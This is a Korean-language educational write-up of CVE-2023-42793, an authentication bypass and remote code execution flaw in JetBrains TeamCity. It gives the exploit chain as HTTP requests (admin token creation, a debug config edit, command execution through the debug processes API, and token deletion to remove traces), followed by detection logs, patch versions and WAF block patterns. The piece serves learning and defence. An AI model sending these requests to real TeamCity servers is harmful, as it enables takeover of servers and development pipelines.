# 취약점 개요

## 📋 설명

**CVE-2023-42793**은 JetBrains TeamCity 서버에서 발생한 **인증 우회(Remote Authentication Bypass)** 및 **원격 코드 실행(RCE)** 취약점입니다.

REST API 내부의 **잘못된 예외 처리와 와일드카드(`/**`) 기반 경로 허용** 때문에, 공격자가 인증 없이 관리자 권한 토큰을 생성할 수 있습니다.

TeamCity는 전 세계적으로 널리 사용되는 CI/CD 플랫폼이며, 강력한 권한 체계를 기반으로 동작합니다. 그러나 이 취약점에서는 권한 검증이 특정 경로에서 완전히 무력화됩니다.

### ✔ 한 줄 요약

> **인증 없는 API 접근 → 관리자 토큰 생성 → 서버에서 직접 명령 실행 가능 → 완전한 시스템 장악**

## ⚠️ 왜 위험한가?

**매우 낮은 공격 난이도**: 인증 없이 API 접근 가능

**광범위한 영향**: 전 세계 CI/CD 환경이 잠재적 위험에 노출

**완전한 시스템 장악**: 관리자 토큰 획득 후 서버에서 직접 명령 실행 가능

**DevOps 파이프라인 탈취**: TeamCity·Jenkins·GitLab 같은 DevOps 시스템 탈취는 기업 전체 개발 파이프라인 탈취로 이어질 수 있음

**기본 관리자 구조의 위험성**: 기본 Admin 계정(ID=1)은 브루트포싱 없이 바로 공격 대상으로 사용됨

---

## 취약점 정보

| 항목           | 내용                                                      |
| -------------- | --------------------------------------------------------- |
| CVSS 점수      | 9.8 (Critical)                                           |
| 취약점 유형    | 인증 우회 → 관리자 토큰 생성 → REST API 통한 RCE         |
| 영향 버전      | TeamCity 2023.05.3 이하 전체 버전                         |
| 공격 난이도    | 매우 낮음 (인증 불필요)                                    |
| 공개일         | 2023년                                                    |
| 영향 범위       | 전 세계 CI/CD 환경(기업·기관·개발 팀 등)                  |

## 🧠 핵심 원인: 인증 제외 경로의 와일드카드 처리

JetBrains TeamCity의 특정 REST API 엔드포인트는 **`/**` 형태의 와일드카드 예외 규칙으로 인해 인증 검증이 아예 적용되지 않습니다**.

즉,

- 원래는 로그인해야 접근 가능한 API

- 하지만 **특정 경로가 인증 체크에서 제외됨**

- 공격자는 여기로 접근해 곧바로 관리자 토큰을 생성할 수 있음

### 인증 우회 원리

TeamCity 관리자 계정은 기본적으로 **ID=1** 이며, 아래 API 접근만으로 해당 계정에 대한 **관리자 토큰 생성 가능**:

```http
POST /app/rest/users/id:1/tokens/RPC2
```

이후 공격자는 토큰을 Authorization 헤더에 포함해 아래 API를 호출:

- 디버그 설정 수정
- 명령 실행 API 호출
- 파일 수정
- 설정 업데이트
- 악성 코드 배포 등...

---

# 공격 시나리오

TeamCity 서버를 장악하는 과정은 다음 4단계로 구성됩니다:

**Step 1. 인증 우회 엔드포인트 탐지**

공격자가 인증 제외 경로를 탐색

**Step 2. 관리자 토큰 생성**

```http
POST /app/rest/users/id:1/tokens/RPC2 HTTP/1.1
Host: <TEAMCITY_IP>:8111
Content-Type: application/json
```

결과: 관리자 권한 API 토큰 획득

**Step 3. TeamCity 설정 변경**

공격자는 내부 설정 파일을 조작해 디버그 모드를 활성화합니다.

```http
POST /admin/dataDir.html?action=edit&fileName=config/internal.properties&content=debug=true
```

**Step 4. 임의 명령 실행 (RCE)**

아래 API로 OS 명령을 직접 실행할 수 있습니다.

```http
POST /app/rest/debug/processes?exePath=cmd.exe+/c+hostname
Authorization: Bearer <ADMIN_TOKEN>
```

Linux 환경에서는 다음과 같이 동작:

```http
POST /app/rest/debug/processes?exePath=/bin/bash+-c+'id'
```

**Step 5. 공격 흔적 삭제**

공격자가 생성한 토큰은 DELETE 요청으로 제거할 수 있습니다.

```http
DELETE /app/rest/users/id:1/tokens/RPC2
```

---

# 실습 환경 구성

| 역할        | 구성                        | IP            |
| ----------- | --------------------------- | ------------- |
| 피해자 서버 | TeamCity 2023.05.3 (취약)   | -             |
| 공격자      | Kali Linux 또는 Windows     | -             |

## 사전 준비사항

- TeamCity 취약 버전 설치
- 기본적인 HTTP 요청 지식 (curl 또는 Burp Suite)
- REST API 이해
- CI/CD 시스템 구조 이해

---

# 취약점 상세 분석

## 📁 로그 기반 공격 흔적

TeamCity의 주요 로그 파일:

```bash
<설치경로>/logs/teamcity-activities.log
```

여기서 다음 항목이 발견되면 공격 의심 가능:

- `config/internal.properties was modified`
- `Command line: <명령>`
- 특정 사용자 없이 생성된 토큰 기록

## 인증 우회 메커니즘

- TeamCity의 특정 REST API 엔드포인트는 와일드카드(`/**`) 예외 규칙으로 인증 검증이 적용되지 않음
- 관리자 계정(ID=1)에 대한 토큰 생성이 인증 없이 가능
- 생성된 토큰으로 모든 관리자 기능 접근 가능

---

# 패치 정보

## 안전한 버전

- **TeamCity 2023.05.4 이상**

JetBrains는 이 취약점을 매우 심각하게 분류하며, 즉시 업그레이드를 권고하고 있습니다.

## 즉시 패치

TeamCity 2023.05.4 이상으로 업그레이드

## 외부 노출 차단

- TeamCity UI/API를 반드시 프라이빗 네트워크 또는 VPN 뒤에 둘 것

## 토큰 관리 강화

- 불필요한 토큰 삭제
- 토큰 생성 로그 모니터링

## WAF 규칙 추가

다음 패턴을 차단:

- `/app/rest/users/id:*`
- `/app/rest/debug/`
- `/dataDir.html?action=edit`

## 설정 파일 권한 최소화

내부 설정 파일 수정 권한을 root 관리자에게만 부여

---

# 학습 포인트 (CVE 학습자용 요약)

## 🔹 인증 우회 취약점의 파급력

인증 한 번 우회되면 시스템 전체가 무너짐.

## 🔹 CI/CD 시스템의 중요성

TeamCity·Jenkins·GitLab 같은 DevOps 시스템 탈취는 기업 전체 개발 파이프라인 탈취로 이어질 수 있음.

## 🔹 REST API는 반드시 Zero-Trust 접근 제어 필요

API는 비공개여야 하고, 인증·검증 체계 필수.

## 🔹 기본 관리자(ID=1) 구조의 위험성

기본 Admin 계정은 브루트포싱 없이 바로 공격 대상으로 사용됨.

## 취약점 요약표

| 항목           | 내용                                                      |
| -------------- | --------------------------------------------------------- |
| 취약점 원인    | 인증 제외 경로에서 와일드카드 처리                        |
| 악용 방식      | 관리자 토큰 생성 → 설정변경 → RCE                         |
| 공격 난이도    | 매우 낮음                                                  |
| 영향           | 서버 장악, DevOps 파이프라인 탈취                         |
| 패치 버전      | 2023.05.4 이상                                            |

---

# 참고 자료

- [NVD 상세정보](https://nvd.nist.gov/vuln/detail/CVE-2023-42793)

- [JetBrains 공식 보고서](https://www.jetbrains.com/help/teamcity/security-advisory-2023-09-18.html)

- [GitHub PoC 레포지토리](https://github.com/)

